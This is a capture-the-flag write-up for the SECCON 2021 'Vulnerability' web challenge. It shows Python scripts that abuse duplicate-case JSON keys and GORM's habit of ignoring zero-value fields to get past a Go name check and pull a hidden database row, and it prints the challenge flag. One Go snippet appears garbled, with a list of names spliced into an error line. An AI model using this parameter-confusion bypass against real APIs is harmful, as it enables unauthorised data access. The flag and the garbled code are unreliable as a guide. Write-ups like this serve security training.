*2021-12-11*

#ctf-writeup 

Link: https://ctf.seccon.jp/

***

# Vulnerability
**Category: web**

## Description
How many vulnerabilities do you know?
https://vulnerabilities.quals.seccon.jp

## Method
The code is written in Go. This website also has two API Endpoints: a GET request to https://vulnerabilities.quals.seccon.jp/api/vulnerability will give you all the vulnerabilities in the database (except the flag), and a POST request to the same endpoint with the parameter `name=?` will give you the details about a specific vulnerability.

There is a vulnerability in the database that corresponds to the name of the flag. Unfortunately the name is set as an environment variable, so it is hidden.

## Basic POST Script
This script makes a request to get information about the SGAxe vulnerability:

```python
import requests
import json
url = "https://vulnerabilities.quals.seccon.jp/api/vulnerability"
payload = {
    "Name": "SGAxe"
    }
resp = requests.post(url, json=payload)
print(resp.status_code)
print(resp.text)
```

It returns the following:

```json
200
{"Logo":"/images/sgaxe.png","URL":"https://cacheoutattack.com/"}
```

## General Thoughts
Since the description is: "How many vulnerabilities do you know?", there will likely be a vulnerability with Go, or possibly with Gin.

https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGINGONICGIN-550031

It's also possible that we can use the way GORM runs queries. Supposedly, if the other fields in the query are blank, it will use the Model object to run the query.

The following query returns the Heartbleed object:

```python
import requests
import json
url = "https://vulnerabilities.quals.seccon.jp/api/vulnerability"
payload = {
    "Name": "Heartbleed",
    "ID" : 1
    }
resp = requests.post(url, json=payload)
print(resp.status_code)
print(resp.text)
```

While this one does not, because the ID does not match.

```python
import requests
import json
url = "https://vulnerabilities.quals.seccon.jp/api/vulnerability"
payload = {
    "Name": "Heartbleed",
    "ID" : 2
    }
resp = requests.post(url, json=payload)
print(resp.status_code)
print(resp.text)

```

The problem is that the Go code checks for fields being either blank or nil through the following lines:

```go
if name, ok := json["Name"]; !ok || name == "" || name == nil {
    c.JSON(400, gin.H{"Error"","DROWN Attack","CCS Injection","httpoxy","Meltdown","Spectre","Foreshadow","MDS","ZombieLoad Attack","RAMBleed","CacheOut","SGAxe"]}: "no \"Name\""})
    return
}
```

## Solution
In order to solve this challenge we need to circumvent the `Name` check. However, the problem is that if we specify a name then we can not get the flag because the name would be added to the SQL query. Since we don't know the name, the query would not return any results.

We need to find a way to make the code think we are sending a name but not have it affect the query.

GORM, the query library used, has the following in it's documentation:
```
NOTE When querying with struct, GORM will only query with non-zero fields, that means if your field’s value is 0, '', false or other zero values, it won’t be used to build query conditions, for example...
```

This means that by making `Name` the empty string, a zero value in Go, then GORM will not evaluate it in the query.

The following JSON seems to work. By sending the name twice, one of them the empty string and the other not, the non-empty string will allow the `Name` check to pass, but the query itself will use the empty string, thus not evaluating it.

```json
{
    "Name": "a",
    "name": "",
}
```

Then, to specify the row containing the flag in the query we can use the `ID` column that was added by the `gorm.Model` when defining the `Vulnerability` struct.

```go
type Vulnerability struct {
    gorm.Model
    Name string
    Logo string
    URL  string
}
```
https://gorm.io/docs/models.html#Embedded-Struct

Flag was the 14th row added, so it's `ID` is 14.

Posting with the following JSON will retrieve the flag:
```json
{
    "Name": "a",
    "name": "",
    "ID": 14
}
```

```json
{"Logo":"/images/SECCON{LE4RNING_FR0M_7HE_PA5T_FINDIN6_N0TABLE_VULNERABILITIE5}.png","URL":"seccon://SECCON{LE4RNING_FR0M_7HE_PA5T_FINDIN6_N0TABLE_VULNERABILITIE5}"}
```

## Solve Script
```python
import requests

def main():
    HOST = "https://vulnerabilities.quals.seccon.jp/api/vulnerability"

    json = {
        "Name": "a",
        "name": "",
        "ID": 14
    }

    r = requests.post(HOST, json=json)

    print(r.text)

main()
```

## Flag
`SECCON{LE4RNING_FR0M_7HE_PA5T_FINDIN6_N0TABLE_VULNERABILITIE5}`

***
